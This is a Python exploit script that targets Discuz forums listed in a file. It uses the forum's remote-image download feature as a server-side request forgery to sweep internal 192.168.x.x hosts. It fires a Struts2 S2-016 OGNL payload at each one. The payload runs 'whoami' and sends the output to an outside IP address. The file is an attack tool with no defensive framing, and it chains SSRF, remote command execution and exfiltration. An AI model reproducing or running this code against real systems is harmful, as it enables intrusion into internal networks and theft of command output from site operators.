#!/usr/bin/env python
# encoding: utf-8

import os
import sys
import urlparse
import requests
import re


def exploit_ssrf():

    for website in open('ssrf_vuln.txt'):

        request = requests.session()
        website = website.strip()
        formurl = 'http://{website}/forum.php'.format(website=website)
        try:
            # print formurl
            response = request.get(formurl)
            formhash = re.findall(r'formhash" value="(.*?)"', response.content)
            if formhash:
                print 'formhash: ', formhash
                # payload = 'http://45.32.250.207/404.php?s={website}.jpg'.format(website=website)
                for third in xrange(255):
                    for forth in xrange(255):
                        ip = '192.168.' + str(third) + '.' + str(forth) + ':8080/login.action'
                        # s2-016
                        payload = ip + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d\"http://45.32.250.207/result%3d\".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(\"GET\"),%23http.connect(),%23http.getInputStream()}"
                        url = 'http://{website}/forum.php?mod=ajax&action=downremoteimg&formhash={formhash}&message=[img]{payload}[/img]'.format(
                               website=website,
                               formhash=formhash,
                               payload=payload)
                        response = request.get(url, timeout=5, verify=False)
                        print url, len(response.content)
        except Exception, e:
            print website, e


def main():

    exploit_ssrf()


if __name__ == '__main__':
    os.system('clear')

    main()
